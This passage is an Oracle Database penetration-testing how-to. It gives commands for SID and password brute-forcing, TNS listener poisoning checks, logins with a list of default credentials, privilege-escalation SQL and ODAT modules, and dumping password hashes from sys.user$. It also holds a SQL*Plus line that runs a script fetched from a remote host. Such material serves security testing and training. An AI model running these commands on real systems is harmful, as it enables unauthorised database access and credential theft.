@@ -1,0 +1,1085 @@
+*****  ORACLE DATABASE PENETRATION TESTING (HOW TO) *****  
+
+============================================================================================================================
+INDEX
+============================================================================================================================
+01. Reminder (definitions)
+02. List of attacks (Oracle Database Penetration Testing)
+03. How to perform a network TCP ports scan to locate an Oracle Database DB (e.g. range: 1521-1560)
+04. How to perform a SID Brute-force attack to identify a valid SID
+05. How to perform a brute-force attack to identify valid database credentials (logins & passwords)
+06. How to identify valid credentials using a TNS Listener Poisoning Attack (MITM - CVE 2012-1675) 
+07. How to identify Oracle database vulnerabilities due to missing security patches
+08. How to connect to an Oracle Database using valid credentials
+09. How to identify and exploit database and OS privileges escalation vulnerabilities
+10. How to dump and crack Oracle password hashes (10g, 11g, 12c)
+
+
+
+=============================================================================================================================
+01. REMINDER (basic definitions) 
+=============================================================================================================================
+• SCHEMA
+A schema is a collection of logical structures of data, or schema objects. A schema is owned by a database user and has the same name as that user.
+Each user owns a single schema. Schema objects can be created and manipulated with SQL
+
+• TABLES
+Tables are the basic unit of data storage in an Oracle Database. Data is stored in rows and columns. 
+
+• VIEWS
+Views are virtual tables formed by a query. A view is a dictionary object that you can use until you drop it. 
+Views are not updatable.
+
+• TRIGGERS
+Database triggers are procedures written in PL/SQL, Java, or C that run (fire) implicitly whenever a table or view is modified or when some user actions or database system actions occur.
+You can write triggers that fire whenever one of the following operations occurs: DML statements on a particular schema object, DDL statements issued within a schema or database, user logon or logoff events, server errors, database startup, or instance shutdown.
+
+• PL/SQL
+It is a third generation language that has the expected procedural and namespace constructs, and its tight integration with SQL makes it possible to build complex and powerful applications.
+Because PL/SQL is executed in the database, you can include SQL statements in your code without having to establish a separate connection.
+
+• STORED PROCEDURE
+A stored procedure is a named PL/SQL block which performs one or more specific task. This is similar to a procedure in other programming languages. 
+
+• DATABASE LINK (DBlinks)
+A database link is a pointer that defines a one-way communication path from an Oracle Database server to another database server. 
+
+• SYNONYM
+Synonyms are a powerful feature of Oracle and other SQL-compliant relational database systems. 
+They are used as a database shorthand. They make it possible to shorten the specification of long or complex object names. 
+This is especially useful for shared tables or views. In addition, the use of DATABASE LINKS in synonyms allows transparent access to other databases on other nodes or even other entire systems halfway around the globe. 
+
+• DATABASE
+A database is the set of files where application data (the reason for a database) and meta data is stored. 
+
+• INSTANCE
+An instance is the software (and memory) that Oracle uses to manipulate the data in the database. In order for the instance to be able to manipulate that data, the instance must open the database. A database can be opened (or mounted) by more than one instance, however, an instance can open at most one database. 
+
+• LISTENER (config file: listener.ora)
+A process that resides on the server whose responsibility is to listen for incoming client connection requests and manage the traffic to the database server. 
+When a client requests a network session with a database server, a listener receives the actual request. If the client information matches the listener information, then the listener grants a connection to the database server.
+
+• PUBLIC ROLE
+Every database accounts have at least the privileges granted to the PUBLIC role.
+
+• SYSDBA and SYSOPER PRIVILEGES
+SYSDBA and SYSOPER are administrative privileges required to perform high-level administrative operations such as creating, starting up, shutting down, backing up, or recovering the database. 
+The SYSDBA system privilege is for fully empowered database administrators and the SYSOPER system privilege allows a user to perform basic operational tasks, but without the ability to look at user data.
+
+In order to log into an Oracle database you need the following information:
+===========================================================================
++ 1 IP address
++ 1 Port (default : 1521)
++ 1 SID (Site ID, ORACLE_SID, INSTANCE_NAME) or 1 Service (SERVICE_NAME, DB_NAME)
++ 1 Login
++ 1 Password
+
+
+
+============================================================================================================================
+02. List of attacks (Oracle Database Penetration Testing)
+============================================================================================================================
+
+Black-box penetration test (FROM unauthenticated attacker TO authenticated database user)
+-----------------------------------------------------------------------------------------
+• Brute-force attack to identify default or trivial db credentials
+• Exploitation of the insecure ’Remote OS Authentication’ mechanism (if enabled)
+• You have compromised a server and you found clear-text Oracle database credentials hardcoded in scripts, configuration files, .bash_history files or application source code. 
+• SQL injection in a Web application that allows to run unauthorized SQL queries to an Oracle database
+• Man-In-The-Middle attack to eavesdropped clear-text or hashed credentials (e.g. TNS listener poisoning, ARP poisoning, Responder (oracle on Windows))
+• Run an Oracle database remote exploit (0 day or missing patches)
+• …
+
+Grey-box penetration test (FROM (low privileged) database user TO privileged database user OR database administrator (DBA))
+---------------------------------------------------------------------------------------------------------------------------
+• Identify and exploit privileges escalation vulnerabilities due to weak permissions that will allow you to run unauthorized OS commands or scripts on the Linux/Unix/Windows server underlying the database. The OS commands (or reverse shell) will be run with the OS account who owns the database and has DBA privileges. It means that you will have access to the Oracle database with administration privileges through the OS.
+  For example a regular db user with the following roles and/or privileges can execute unauthorized OS commands or scripts on a Linux/Unix/Windows server hosting an Oracle database:
+	+ JAVASYSPRIV role
+	+ DBMS_SCHEDULER stored procedure + CREATE EXTERNAL JOB privilege
+	+ ORADBG (debugger)
+	+ External tables privilege
+	
+• Identify and exploit privileges escalation vulnerabilities that will allow you to become directly database administrator (DBA). 
+  For example a regular db user with the following combinations of database system privileges may very often become DBA:
+	+ CREATE PROCEDURE + EXECUTE ANY PROCEDURE
+	+ CREATE ANY TRIGER + CREATE PROCEDURE
+	+ ANALYZE ANY + CREATE PROCEDURE
+	+ CREATE ANY INDEX + CREATE PROCEDURE
+
+• Identify and exploit privileges escalation vulnerabilities that will allow you to get unauthorized access to sensitive data belonging to other users/schemas. 
+  For example a regular db user with the following privilege(s) can escalate its privileges and access to other users’ data:
+	+ BECOME USER privilege
+	+ CONNECT THROUGH (proxy rights) privilege
+	+ ALTER USER privilege
+	+ GRANT/ALTER ANY ROLE privilege
+	+ GRANT ANY PRIVILEGE privilege
+	+ SELECT ANY TABLE privilege
+	+ BACKUP ANY TABLE privilege
+	+ …
+
+• Exploit insecure ‘Database Links’ (if any)
+• Run an Oracle database local exploit (0 day or missing patches)
+• Brute-force attack (default or easy guessable credentials)
+• Capture SMB Authentication
+
+
+
+============================================================================================================================
+03. How to perform a network TCP ports scan to locate an Oracle Database DB (e.g. range: 1521-1560)
+============================================================================================================================
+
+
+
+NMAP (https://nmap.org)
+--------------------------------------------------------------
+pentester@LinuxVM > nmap -P0 -vv -sS -sV -p 1521-1560 192.168.1.136
+pentester@LinuxVM > nmap -P0 -vv -sS -sV -p 15021-15060 192.168.1.136
+
+Tips: In Windows environment, you can use the 'NET VIEW' command or a powershell script or ADexplorer [...] to list all the computers of a domain and look for Oracle servers.
+
+	<snip>
+	ORADB-PRD.company-domain
+	DBSRV-PRD.company-domain
+	SQLSRV-PRD.company-domain
+	<snip>
+
+
+============================================================================================================================
+04. How to perform a SID Brute-force attack to identify a valid SID
+============================================================================================================================
+
+Note: the default value of an Oracle SID is: ‘ORCL’.
+
+
+1. ODAT (https://github.com/quentinhardy/odat/wiki/all)
+--------------------------------------------------------------
+pentester@LinuxVM > cd /home/pentester/Documents/odat-2.2.0/odat-2.2.0/
+pentester@LinuxVM > ./odat.py sidguesser -s 192.168.1.136 -p 1521 --side-file=/home/pentester/Documents/Default-SID-list.txt
+
+
+2. Metasploit - 'sid_brute' module (https://www.metasploit.com)
+---------------------------------------------------------------
+This module simply attempts to discover the protected Oracle SID.
+
+pentester@LinuxVM > msfconsole
+msf > use auxiliary/scanner/oracle/sid_brute
+      msf auxiliary(sid_brute) > show options
+       ...show and set options...
+      msf auxiliary(sid_brute) > set STOP_ON_SUCCESS true
+      msf auxiliary(sid_brute) > run
+
+
+3. SIDguess (available in KALI Linux)
+--------------------------------------------------------------
+pentester@LinuxVM > cd /home/pentester/Documents/SIDGuesser
+pentester@LinuxVM > ./sidguess -i 192.168.1.9 -p 1521 -d /home/pentester/Documents/Default-SID-list.txt -r report.txt 
+
+
+4. NMAP - 'oracle-brute' script (https://nmap.org)
+--------------------------------------------------------------
+pentester@LinuxVM > nmap --script=oracle-brute -p 1521 --script-args="oracle-brute.sid=ORCL,userdb='/home/pentester/Documents/Default-Oracle-users.txt',passdb='/home/pentester/Documents/Default-Oracle-pwds.txt'" 192.168.1.10
+
+
+============================================================================================================================
+05. How to perform a brute-force attack to identify valid database credentials (logins & passwords)
+============================================================================================================================
+
+WARNING: To avoid to perform a Denial of Service attack, do not attempt more than 3 password tries if you don't know if there is an account lockout mechanism enabled.
+
+There are numerous default oracle credentials...
+	sys/change_on_install
+	system/manager
+	system/welcome1
+	dbsnmp/dbsnmp
+	outln/outln
+	scott/tiger
+	ctxsys/ctxsys
+	xdb/xdb
+	oracle/oracle
+	internal/oracle
+	wwwuser/wwwuser
+	sysadmin/sysadmin
+	ocitest/ocitest
+	oracle_ocm/oracle_ocm
+	ocm_db_admin/ocm_db_admin
+	oracleadmin/welcome
+	patrol/patrol
+	perfstat/perfstat
+	dip/dip
+	DDIC/199220706
+	EARLYWATCH/SUPPORT
+	SAP/06071992
+	SAPR3/SAP
+	SAP/SAPR3
+	...
+
+1. ODAT - 'passwordguesser' module (https://github.com/quentinhardy/odat/wiki/all)
+-----------------------------------------------------------------------------------
+
+* Try once the default Oracle DB accounts and passwords
+  Path to the default accounts/passwords file: /home/pentester/Documents/odat-2.2.0/odat-2.2.0/accounts/accounts.txt
+  Tips: try lowercase and uppercase accounts and passwords
+ 
+pentester@LinuxVM > ./odat.py passwordguesser -s 192.168.1.136 -p 1521 -d ORCL 
+
+
+* Try multiple passwords for each default Oracle db account 
+  Path to the default accounts/passwords file: /home/pentester/Documents/odat-2.2.0/odat-2.2.0/accounts/multiple_accounts.txt
+  Tips: try lowercase and uppercase accounts and passwords
+  Warning: risk of locking all the db accounts...
+
+pentester@LinuxVM > ./odat.py passwordguesser -s 192.168.1.136 -p 1521 -d ORCL --accounts-file accounts_multiple.txt
+
+
+2. NMAP - 'oracle-brute.nse' script (https://nmap.org)
+--------------------------------------------------------------
+pentester@LinuxVM > nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL 192.168.1.136
+pentester@LinuxVM > nmap --script=oracle-brute -p 1521 --script-args="oracle-brute.sid=ORCL,userdb='/home/pentester/Documents/Default-Oracle-users.txt',passdb='/home/pentester/Documents/Default-Oracle-pwds.txt'" 192.168.1.136
+
+
+3. METASPLOIT - 'oracle_login' module (https://www.metasploit.com)
+------------------------------------------------------------------
+Oracle Account Discovery: This module uses a list of well known default authentication credentials to discover easily guessed accounts.
+
+pentester@LinuxVM > msfconsole
+msf > use auxiliary/admin/oracle/oracle_login
+      msf auxiliary(oracle_login) > show actions
+            ...actions...
+      msf auxiliary(oracle_login) > set ACTION <action-name>
+      msf auxiliary(oracle_login) > show options
+            ...show and set options...
+      msf auxiliary(oracle_login) > run
+    
+
+============================================================================================================================
+06. How to identify valid credentials using a TNS Listener Poisoning Attack (MITM - CVE 2012-1675) 
+============================================================================================================================
+
+WARNING: 
+	+ Do not attempt this attack in a production environment (only in UAT or DEV) as there is a risk of Deny Of Service.
+	+ All versions up to version 12c are vulnerable to ‘TNS Listener Poisoning’ attack. 
+
+
+1. ODAT  - 'tnspoison' (https://github.com/quentinhardy/odat/wiki/all)
+----------------------------------------------------------------------
+pentester@LinuxVM > ./odat.py tnspoison -s 192.168.1.9 -p 1521 -d ORCL --test-module
+
+
+2. METASPLOIT - 'tnspoison_checker' module (https://www.metasploit.com)
+------------------------------------------------------------------------
+Oracle TNS Listener Checker: This module checks the server for vulnerabilities like TNS Poison. Module sends a server a packet with command to register new TNS Listener and checks for a response indicating an error.
+If the registration is errored, the target is not vulnerable. Otherwise, the target is vulnerable to malicious registrations.
+
+pentester@LinuxVM > msfconsole
+msf > use auxiliary/scanner/oracle/tnspoison_checker
+      msf auxiliary(tnspoison_checker) > show actions
+            ...actions...
+      msf auxiliary(tnspoison_checker) > set ACTION <action-name>
+      msf auxiliary(tnspoison_checker) > show options
+            ...show and set options...
+      msf auxiliary(tnspoison_checker) > run
+    
+
+=====================================================================================
+07. How to identify Oracle database vulnerabilities due to missing security patches
+=====================================================================================
+
+1. ODAT - 'tnscmd' module (https://github.com/quentinhardy/odat/wiki/all)
+--------------------------------------------------------------------------
+pentester@LinuxVM > ./odat.py tnscmd -s 192.168.1.9 -p 1521 -d ORCL --version
+
+Examples:
+* CVE-2014-4237: A user authenticated can modify all tables who can select even if he has not the privilege to modify them normally (no ALTER privilege).
+* CVE-2012-3137: The authentication protocol in Oracle Database Server 10.2.0.3, 10.2.0.4, 10.2.0.5, 11.1.0.7, 11.2.0.2, and 11.2.0.3 allows remote attackers to obtain the session key and salt for arbitrary users, which leaks information about the cryptographic hash and makes it easier to conduct brute force password guessing attacks, aka "stealth password cracking vulnerability." 
+* CVE 2012-1675: TNS Listener MITM Poisonning Attack 
+
+
+2. Metasploit - 'tnscmd' module (https://www.metasploit.com)
+--------------------------------------------------------------
+Oracle TNS Listener Command Issuer: This module allows for the sending of arbitrary TNS commands in order to gather information.
+Inspired from tnscmd.pl from www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd.
+
+pentester@LinuxVM > msfconsole
+msf > use auxiliary/admin/oracle/tnscmd
+      msf auxiliary(tnscmd) > show actions
+
+
+
+============================================================================================================================
+08. How to connect to an Oracle Database using valid credentials
+============================================================================================================================
+
+1. SQL*plus (Command line Oracle client)
+--------------------------------------------------------------
+pentester@LinuxVM > sqlplus /nolog					-- Linux
+	SQL> connect username/password@IP-address:port/SID
+	SQL> show user; 						-- show the current db user 
+	SQL > @/oracle/scripts/script.sql				-- run a script file called script.sql that was located in the /oracle/scripts directory.
+	SQL > @http://www.orasploit.com/becomedba.sql 			-- execute a SQL Script from a HTTP server (FTP is also possible)
+	SQL> show parameter						-- show all parameters of the database
+	SQL> show parameter audit					-- show audit settings
+	SQL> set term off						-- disable terminal output
+	SQL> set term on						-- enable terminal output
+	SQL> Set heading off						-- disable headlines
+	SQL> Set pagesize 0						-- disable pagesize
+	SQL> Set timing on						-- show execution time
+	SQL> Set autocommit on						-- commit everything after every command (!dangerous!)
+	SQL> set serveroutput on					-- enable output from dbms_output
+	SQL> spool c:\myspool.txt					-- create a logfile of the SQL*Plus Session called myspool.txt (disable: spool off)
+	SQL> desc utl_http						-- show package specification of utl_http
+	SQL> desc all_users						-- show view specification of all_users
+	SQL> shutdown immediate;					-- shutdown the db
+	SQL> startup;							-- start the db
+	SQL> disconnect							-- disconnect
+
+	
+C:\ORACLE\sqlplus.exe /nolog						-- Windows	
+    SQL> connect username/password@IP-address:port/SID
+
+Other commands to login (examples):
+pentester@LinuxVM > sqlplus64 sys/change_on_install@//192.168.1.9:1521/orcl as sysdba
+pentester@LinuxVM > sqlplus64 sys/change_on_install@//192.168.1.10:1521/orcl as sysoper
+pentester@LinuxVM > sqlplus64 system/manager@//192.168.1.136:1521/orcl
+pentester@LinuxVM > sqlplus64 dbsnmp/dbsnmp@//192.168.1.10:1521/orcl
+pentester@LinuxVM > sqlplus64 scott/tiger@//192.168.1.10:1521/orcl
+
+
+Personal notes:
+-Path: "/usr/lib/oracle/11.2/client64/bin/sqlplus" and "/opt/oracle/instantclient_10_2/sqlplus"
+-export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/lib/oracle/11.2/client64/lib
+-export PATH=$PATH:/usr/lib/oracle/11.2/client64/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+
+
+
+2. DbVisualizer (GUI multi-database client)
+--------------------------------------------------------------
+pentester@LinuxVM > sudo find / -name dbvis
+		/root/DbVisualizer/wrapper/classes/com/onseven/dbvis
+		/root/DbVisualizer/dbvis
+		/usr/local/bin/dbvis
+
+pentester@LinuxVM > sudo su
+root@LinuxVM > cd /root/DbVisualizer/
+root@LinuxVM > ./dbvis
+
+On the GUI
+> Go to "TOOLS"
+> Go to "New Connection Wizard"
+> Enter "Oracle pentest training"
+> Select Database Connector "Oracle THIN" (Connection type = Service) vs "Oracle OCI"
+> Enter all the right info
+> "Ping Server"
+> "Connect"
+
+
+============================================================================================================================
+09. How to identify and exploit database and OS privileges escalation vulnerabilities
+============================================================================================================================
+
+
+09.1. Check for various useful information (i.e. list of users, DB password policy, who is DBA...) 
+===================================================================================================
+
+* Manual checks - Version and Patchs
+------------------------------------
+ SQL> SELECT * FROM V$VERSION;																	//Check the DB version
+ SQL> SELECT action_time, action, namespace, version, comments FROM dba_registry_history;	//Check that the Oracle Patch Updates are installed
+ 
+ 
+* Manual checks - Passwords
+---------------------------
+ SQL> SELECT username,password,account_status FROM dba_users;		//Oracle 10g = List the accounts and their status (active etc.), display the passwords (hashs)
+ SQL> SELECT * FROM sys.user$;						//Oracle 11g = List the accounts and their status (active etc.), display the passwords (hashs)
+ SQL> select * from dba_users_with_defpwd;				//Oracle 11g = List the accounts which have a default passwords
+ SQL> SELECT username,password_versions FROM dba_users;			//Oracle 11g = List the type of passwords stored "10g" (i.e. DES) and/or 11g (i.e. SHA-1)
+ SQL> SELECT * FROM dba_profiles order by profile;			//Oracle 11g = Display the different profiles with their password policy
+ SQL> SELECT username,profile,account_status FROM dba_users;		//Oracle 11g = List the accounts and their profile and status
+ 
+ Clear-text passwords can be typically but not necessarily found at the following places:
+ - Server: Shell History files, Linux/Unix Scripts, Log Files, Dump Files, Trace Files
+ - Application Server: JDBC-Config-Files, Trace Files
+ - DBA Client PC: Desktop-Shortcut, Batch-Files, Configuration files of Oracle Tools (like connections.ini), Trace Files
+
+ 
+* Manual checks - Audit trails
+-------------------------------
+ SQL> show parameter audit;				//Check the Audit settings ("Audit_trail" should be set to "OS" or "DB" and "audit_sys_operations" should be set to "TRUE")     
+ SQL> SELECT * FROM sys.dba_stmt_audit_opts;		//Check the current system privileges being audited across the system and by user
+ SQL> SELECT * FROM sys.dba_obj_audit_opts;		//Check current system auditing options across the system and the user
+ 
+ 
+* Manual checks - General parameters
+------------------------------------
+ SQL> SELECT * FROM v$parameter;	//Check the main DB parameters ("O7_DICTIONARY_ACCESSIBILITY", "remote_os_authent", "remote_os_role" should be set to FALSE)
+ 
+ 
+* Manual checks - Privileges
+-----------------------------
+ SQL> SELECT table_name, privilege FROM sys.dba_tab_privs WHERE grantee='PUBLIC';	//Privileges granted to the PUBLIC role on various system tables and views and PL/SQL functions, procedures and packages.  
+ SQL> SELECT username, privilege FROM USER_SYS_PRIVS;					//List of privileges of current to users
+ 
+ SQL> SELECT * FROM dba_sys_privs;			//List of privileges granted to users i.e which users/roles are granted which system privileges (create session, drop any table, etc)
+ SQL> SELECT * FROM user_role_privs;			//list of role by users
+ SQL> SELECT * FROM dba_roles;				//List which users/roles are granted which roles
+ SQL> SELECT * FROM v$pwfile_users;			//Lists users who have been granted SYSDBA and SYSOPER privileges as derived from the password file
+ SQL> SELECT * FROM user_sys_privs;			// Display the system privileges of the current user
+
+ Extensive procedure granted to "PUBLIC"
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'UTL_HTTP' AND grantee = 'PUBLIC';
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = ' ' AND grantee = 'PUBLIC';
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'UTL_SMTP' AND grantee = 'PUBLIC';
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'UTL_TCP' AND grantee = 'PUBLIC';
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'DBMS_JOB' AND grantee = 'PUBLIC';
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'DBMS_SQL' AND grantee = 'PUBLIC';
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'DBMS_SCHEDULER' AND grantee = 'PUBLIC';
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'DBMS_LOB' AND grantee = 'PUBLIC';
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'DBMS_OBFUSCATION_TOOLKIT ' AND grantee = 'PUBLIC';
+ SQL> SELECT grantee , table_name , privilege FROM dba_tab_privs WHERE table_name = 'OWA_UTIL' AND grantee = 'PUBLIC';
+
+
+List of sensitive/dangerous SYSTEM privileges which can lead to database privilege escalation and/or OS privilege escalation and/or full DB/OS compromise
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+• ALTER ANY ROLE 			= Alter any role in the database.
+• GRANT ANY ROLE 			= Grant any role in the database. 
+• GRANT ANY PRIVILEGE 			= Grant any system privilege (not object privileges). 
+• GRANT ALL PRIVILEGES 			= Specify ALL PRIVILEGES to grant all the system privileges, except the SELECT ANY DICTIONARY privilege.
+• ALTER ANY TABLE 			= Alter any table in any schema and compile any view in any schema. 
+• DROP ANY TABLE 			= Drop or truncate any table in any schema.
+• LOCK ANY TABLE 			= Lock any table or view in any schema. 
+• SELECT ANY TABLE 			= Query any table, view, or snapshot in any schema. 
+• UPDATE ANY TABLE 			= Update rows in any table or view in any schema.
+• BACKUP ANY TABLE 			= Use the Export utility to incrementally export objects from the schema of other users.
+• CREATE TABLESPACE 			= Create tablespaces; add files to the operating system via Oracle, regardless of the user's operating system privileges.
+• ALTER TABLESPACE 			= Alter tablespaces; add files to the operating system via Oracle, regardless of the user's operating system privileges. 
+• CREATE ANY USER 			= Create users; assign quotas on any tablespace, set default and temporary tablespaces, and assign a profile as part of a CREATE USER statement.
+• BECOME ANY USER 			= Become another user. (Required by any user performing a full database import.)
+• ALTER USER 				= Alter other users: change any user's password or authentication method, assign tablespace quotas, set default and temporary tablespaces, assign profiles and default roles, in an ALTER USER statement. (Not required to alter own password.)
+• DROP USER 				= Drop another user. 
+• CREATE ANY PROCEDURE 			= Create stored procedures, functions, and packages in any schema. (Requires that user also have ALTER ANY TABLE, BACKUP ANY TABLE, DROP ANY TABLE, SELECT ANY TABLE, INSERT ANY TABLE, UPDATE ANY TABLE, DELETE ANY TABLE, or GRANT ANY TABLE privilege.) 
+• EXECUTE ANY PROCEDURE 		= Execute any procedure or function (stand-alone or packaged), or reference any public package variable in any schema.
+• CREATE JOB 				= Create jobs, schedules, or programs in the grantee's schema.
+• CREATE ANY JOB 			= Create, alter, or drop jobs, schedules, or programs in any schema. Note: This extremely powerful privilege allows the grantee to execute code as any other user. It should be granted with caution.
+• CREATE EXTERNAL JOB			= Create in the grantee's schema an executable scheduler job that runs on the operating system.
+• CREATE ANY TRIGGER	   		= Create database triggers in any schema.
+• ALTER ANY TRIGGER		    	= Enable, disable, or compile database triggers in any schema.
+• CREATE ANY INDEX		    	= Enables a user to create an index on any table or materialized view in the database.
+• ANALYZE ANY				= Analyze any table, cluster, or index in any schema
+
+
+
+* Metasploit - 'oraenum' module:
+--------------------------------
+Oracle Database Enumeration: This module provides a simple way to scan an Oracle database server for configuration parameters that may be useful during a penetration test.
+Valid database credentials must be provided for this module to run.
+
+	pentester@LinuxVM > msfconsole
+	msf > use auxiliary/admin/oracle/oraenum
+	      msf auxiliary(oraenum) > show actions
+		    ...actions...
+	      msf auxiliary(oraenum) > set ACTION <action-name>
+	      msf auxiliary(oraenum) > show options
+		    ...show and set options...
+	      msf auxiliary(oraenum) > run
+
+	Information collected:
+	[*] The versions of the Components are...
+	[*] Auditing...
+	[*] Security Settings...
+	[*] Password Policy...
+	[*] Active Accounts on the System in format Username,Password,Spare4 are...
+	[*] Expired or Locked Accounts on the System in format Username,Password,Spare4 are:
+	[*] Accounts with DBA Privilege, Hash Format on the System are...
+	[*] Accounts with Alter System Privilege on the System are...
+	[*] Accounts with JAVA ADMIN Privilege on the System are...
+	[*] Accounts that have CREATE LIBRARY Privilege on the System are...
+	[*] Default password check...
+
+	Note: 'sudo env LD_LIBRARY_PATH=$LD_LIBRARY_PATH gem install ruby-oci8'
+
+
+09.2. DB Privesc - Check for accounts with "SELECT/UPDATE ANY TABLE" privileges + parameter "07_DICTIONARY_ACCESSIBILITY=TRUE"
+=======================================================================================================================================
+The privileges "SELECT ANY TABLE" and "UPDATE ANY TABLE" are very sensitive as they allows to read/write all the tables and views belonging to others db users/schemas (except SYS / SYTEM schemas).
+
+In addition, in Oracle 11g and earlier versions, if the parameter "O7_DICTIONARY_ACCESSIBILITY" (which controls restrictions on SYSTEM privileges) is set to TRUE, then any user who has the privilege "SELECT ANY TABLE" can read all tables stored in the database including the tables from the SYS schema (it means that it is possible to read the table "sys.user$" which contains the password hashes). 
+It is no longer the case in Oracle 12C.
+
+* Manual checks:
+----------------
+	SQL> SELECT * FROM DBA_SYS_PRIVS WHERE privilege='CREATE ANY TABLE' OR privilege='SELECT ANY TABLE' OR privilege='UPDATE ANY 		TABLE' OR privilege='DROP ANY TABLE';
+	SQL> SELECT * FROM v$parameter WHERE name='O7_DICTIONARY_ACCESSIBILITY';
+
+* Manual attack in ORACLE 11g and earlier (e.g. dump password hashes): 
+----------------------------------------------------------------------
+	SQL> SELECT name, password, spare4 FROM sys.user$;
+
+
+
+09.3. DB Privesc - Check for accounts with "SELECT ANY DICTIONARY" privilege (only for Oracle version =<11G)
+============================================================================================================
+In Oracle 11g and earlier, users who have the 'select any dictionary' privilege can select all tables from the SYS schema including the table "sys.user$" which contains the password hashes. It is no longer the case in Oracle 12C.
+
+* Manual check:
+---------------
+	SQL> SELECT * FROM DBA_SYS_PRIVS WHERE privilege='SELECT ANY DICTIONARY';
+
+* Manual attack in ORACLE 11g and earlier (e.g. dump password hashes): 
+----------------------------------------------------------------------
+	SQL> SELECT name, password, spare4 FROM sys.user$;
+
+  
+
+09.4. Check for accounts with the roles "GRANT ANY ROLE", "ALTER ANY ROLE" and "GRANT ANY PRIVILEGE"
+=====================================================================================================
+The role "GRANT ANY ROLE" allow a user to grant any role to any user except default "DBA" role. It is possible escalate your privileges by adding to your account numerous powerful roles.
+The role "ALTER ANY ROLE" allow a user to modify the role he/she already has to intent to escalate its privileges.
+The role "GRANT ANY PRIVILEGE" allow a user to grant any privileges to any user.
+
+* Manual checks:
+----------------
+	SQL> SELECT * FROM DBA_SYS_PRIVS WHERE privilege='GRANT ANY ROLE' OR privilege='GRANT ANY PRIVILEGE' OR privilege='ALTER ANY ROLE';
+
+* Manual attack (GRANT ANY ROLE): 
+---------------------------------
+	SQL> GRANT javasyspriv TO your_account;		//example: it adds to your db account the powerful JAVASYSPRIV which will allow you to perform remote OS command execution...
+
+* Manual attack (GRANT ANY PRIVILEGE):
+--------------------------------------
+	SQL> GRANT ALL PRIVILLEGES TO any_user_account; 
+	
+
+
+09.5. DB Privesc - Check for accounts with "BECOME USER", "CONNECT THROUGH" (proxy rights), "ALTER USER" privileges
+=====================================================================================================================
+A user with the privileges "BECOME USER" and "ALTER SESSION" can escalate its privileges and access (read/write) data belonging to others users.
+A user with "proxy rights" may escalate its privileges by logging as another user in the Database without knowing the password of the other user.
+A user with the privilege "ALTER USER" can change the password of any user (including dba users except SYS) without knowing their current password..
+
+* Manual checks:
+----------------
+	SQL> SELECT * FROM DBA_SYS_PRIVS WHERE privilege='ALTER USER' OR privilege='ALTER SESSION' OR privilege='BECOME USER';
+	SQL> SELECT * FROM proxy_users;
+
+* Manual attack (proxy rights):
+-------------------------------
+	SQL> sqlplus64 /nolog
+        SQL> CONNECT sudo_user[user-target]/sudo_user_password@192.168.1.10/ORCL;
+        SQL> SHOW USER
+	SQL> SELECT * FROM proxy_users;			//proxy=sudo_user and client=user-target
+
+* Manual attack (BECOME USER):	
+------------------------------
+	SQL> ALTER SESSION SET current_shema=<shema of another user where to create objects>;
+	SQL> SELECT * FROM <shema of another user where to create objects>.tables;
+	SQL> ALTER TABLE <shema of another user where to create objects>.table-to-modify ADD new_value_name varchar2(45);
+	SQL> ...
+
+* Manual attack (ALTER USER):
+-----------------------------	
+	SQL> sqlplus64 /nolog
+        SQL> CONNECT user1/user1_password@192.168.1.10/ORCL;	//e.g. 'user1' has 'ALTER USER' privilege
+	SQL> ALTER USER dbauser IDENTIFIED BY new-password;
+	SQL> ...
+
+
+
+09.6. DB & OS Privesc - Check for accounts with "CREATE/EXECUTE/UPDATE ANY PROCEDURE", "CREATE ANY TRIGER/INDEX", "ANALYZE ANY" privileges
+==========================================================================================================================================
+With the following combinations of database system privileges, an Oracle user may often become DBA and execute OS commands:
+	+ CREATE PROCEDURE + EXECUTE ANY PROCEDURE
+	+ CREATE ANY TRIGER + CREATE PROCEDURE
+	+ ANALYZE ANY + CREATE PROCEDURE
+	+ CREATE ANY INDEX + CREATE PROCEDURE
+
+* Manual checks:
+----------------
+SQL> SELECT * FROM DBA_SYS_PRIVS WHERE privilege='CREATE ANY PROCEDURE' OR privilege='EXECUTE ANY PROCEDURE' OR privilege='UPDATE ANY PROCEDURE' OR privilege='DROP ANY PROCEDURE' OR privilege='CREATE ANY TRIGER' OR privilege='CREATE ANY INDEX' OR privilege='ANALYZE ANY';
+
+* Automatic checks and attacks with ODAT (Automatic OS and DB privilege escalation checks)
+------------------------------------------------------------------------------------------	
+	./odat.py all -s 192.168.1.136 -p 1521 -d ORCL -U SYS -P password
+	./odat.py privesc -s 192.168.1.136 -d $ID -U $USER -P $PASSWORD --get-detailed-privs
+	./odat.py privesc -s 192.168.1.136 -d $ID -U $USER -P $PASSWORD --get-privs
+	./odat.py privesc -s 192.168.1.136 -d $ID -U $USER -P $PASSWORD --test-module
+	./odat.py privesc -s 192.168.1.136 -d ORCL -U $USER -P $PASSWORD --dba-with-create-any-trigger
+	./odat.py privesc -s 192.168.1.136 -d ORCL -U $USER -P $PASSWORD --exec-with-execute-any-procedure 'GRANT dba TO $USER'
+	./odat.py privesc -s 192.168.1.136 -d ORCL -U $USER -P $PASSWORD --revoke-dba-role
+
+	PRIVESC methods:
+		--dba-with-execute-any-procedure, 
+		--alter-pwd-with-create-any-procedure, 
+		--dba-with-create-any-trigger, 
+		--dba-with-analyze-any, 
+		--dba-with-create-any-index,
+		--revoke-dba-role
+		--exec-with-analyze-any, 
+		--exec-with-create-any-index, 
+		--exec-with-create-any-trigger, 
+		--exec-with-create-any-procedure, 
+		--exec-with-execute-any-procedure, 
+
+
